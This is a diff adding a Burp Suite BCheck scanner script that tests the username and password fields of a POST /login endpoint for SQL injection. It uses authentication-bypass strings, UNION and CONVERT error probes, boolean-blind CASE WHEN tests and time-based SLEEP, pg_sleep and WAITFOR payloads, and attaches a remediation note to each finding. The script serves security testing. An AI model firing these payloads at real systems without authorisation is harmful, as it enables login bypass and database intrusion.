@@ -1,0 +1,157 @@
+metadata:
+    language: v2-beta
+    name: "Phantom AI - Aggressive SQLi login multi-vector"
+    description: "Multi-technique SQL injection on POST /login targeting username and password params. Covers error-based (MySQL, SQLite, Postgres, MSSQL), time-based blind (SLEEP, pg_sleep, WAITFOR), boolean-based blind, and UNION-based extraction."
+    author: "BCheck-MCP"
+    tags: "sqli", "login", "phantom-ai", "aggressive"
+
+given request then
+    send payload replacing param value named "username" with "' OR '1'='1'-- -"
+    if response contains "dashboard" or
+       response contains "Welcome" or
+       response contains "logout" or
+       response contains "Logged in" then
+        report issue
+            severity: critical
+            confidence: firm
+            detail: "Authentication bypass via SQL injection on username param of POST /login. Payload: ' OR '1'='1'-- - resulted in successful login indicators (dashboard/welcome/logout) in the response."
+            remediation: "Use parameterised queries. Never concatenate user input into SQL statements."
+        end
+    end
+end
+
+given request then
+    send payload replacing param value named "username" with "admin'-- -"
+    if response contains "dashboard" or
+       response contains "Welcome" or
+       response contains "logout" then
+        report issue
+            severity: critical
+            confidence: firm
+            detail: "Authentication bypass via comment injection on username param. Payload: admin'-- - bypassed password check and returned authenticated content."
+            remediation: "Use parameterised queries for all authentication logic."
+        end
+    end
+end
+
+given request then
+    send payload replacing param value named "username" with "' UNION SELECT null,null,null,null-- -"
+    if response contains "SQL syntax" or
+       response contains "sqlite3.OperationalError" or
+       response contains "pg_query" or
+       response contains "Unclosed quotation mark" or
+       response contains "SELECTs to the left and right" or
+       response contains "used in a UNION" then
+        report issue
+            severity: high
+            confidence: tentative
+            detail: "UNION-based SQLi error disclosure on username param. Payload: ' UNION SELECT null,null,null,null-- - triggered a database error revealing query structure or DBMS type."
+            remediation: "Use parameterised queries. Suppress verbose database errors in production."
+        end
+    end
+end
+
+given request then
+    send payload replacing param value named "username" with "' AND 1=CONVERT(int,(SELECT @@version))-- -"
+    if response contains "SQL Server" or
+       response contains "Conversion failed" or
+       response contains "nvarchar" then
+        report issue
+            severity: high
+            confidence: firm
+            detail: "MSSQL version extraction via CONVERT error on username param. The database version string leaked through a type conversion error."
+            remediation: "Use parameterised queries. Disable verbose error messages."
+        end
+    end
+end
+
+given request then
+    send payload replacing param value named "username" with "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)-- -"
+    if not response contains "subquery returns more than" then
+        send payload replacing param value named "username" with "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)-- -"
+        if response contains "subquery returns more than" or
+           response contains "sub-select returns" or
+           response contains "more than one row" then
+            report issue
+                severity: high
+                confidence: firm
+                detail: "Boolean-based blind SQLi confirmed on username param. CASE WHEN true vs false produced different error responses, proving conditional SQL execution."
+                remediation: "Use parameterised queries for all database interactions."
+            end
+        end
+    end
+end
+
+given request then
+    send payload replacing param value named "username" with "' OR SLEEP(7)-- -"
+    if response time > 6500 then
+        report issue
+            severity: critical
+            confidence: firm
+            detail: "Time-based blind SQLi confirmed on username param (MySQL). Payload: ' OR SLEEP(7)-- - caused a 7+ second delay, confirming SQL execution."
+            remediation: "Use parameterised queries for all database interactions."
+        end
+    end
+end
+
+given request then
+    send payload replacing param value named "username" with "' OR (SELECT 1 FROM (SELECT SLEEP(7))a)-- -"
+    if response time > 6500 then
+        report issue
+            severity: critical
+            confidence: firm
+            detail: "Time-based blind SQLi confirmed on username param (MySQL subquery variant). Nested SLEEP(7) caused a 7+ second delay."
+            remediation: "Use parameterised queries."
+        end
+    end
+end
+
+given request then
+    send payload replacing param value named "username" with "'; SELECT pg_sleep(7);-- -"
+    if response time > 6500 then
+        report issue
+            severity: critical
+            confidence: firm
+            detail: "Time-based blind SQLi confirmed on username param (PostgreSQL). Payload: '; SELECT pg_sleep(7);-- - caused a 7+ second response delay."
+            remediation: "Use parameterised queries."
+        end
+    end
+end
+
+given request then
+    send payload replacing param value named "username" with "'; WAITFOR DELAY '0:0:7';-- -"
+    if response time > 6500 then
+        report issue
+            severity: critical
+            confidence: firm
+            detail: "Time-based blind SQLi confirmed on username param (MSSQL). WAITFOR DELAY caused a 7+ second response delay."
+            remediation: "Use parameterised queries."
+        end
+    end
+end
+
+given request then
+    send payload replacing param value named "password" with "' OR SLEEP(7)-- -"
+    if response time > 6500 then
+        report issue
+            severity: critical
+            confidence: firm
+            detail: "Time-based blind SQLi confirmed on PASSWORD param (MySQL). Payload: ' OR SLEEP(7)-- - caused a 7+ second delay on the password field."
+            remediation: "Use parameterised queries. Hash and compare passwords securely."
+        end
+    end
+end
+
+given request then
+    send payload replacing param value named "password" with "' OR '1'='1'-- -"
+    if response contains "dashboard" or
+       response contains "Welcome" or
+       response contains "logout" then
+        report issue
+            severity: critical
+            confidence: firm
+            detail: "Authentication bypass via SQLi on password param of POST /login. Payload: ' OR '1'='1'-- - bypassed authentication."
+            remediation: "Use parameterised queries. Never compare passwords via SQL string concatenation."
+        end
+    end
+end
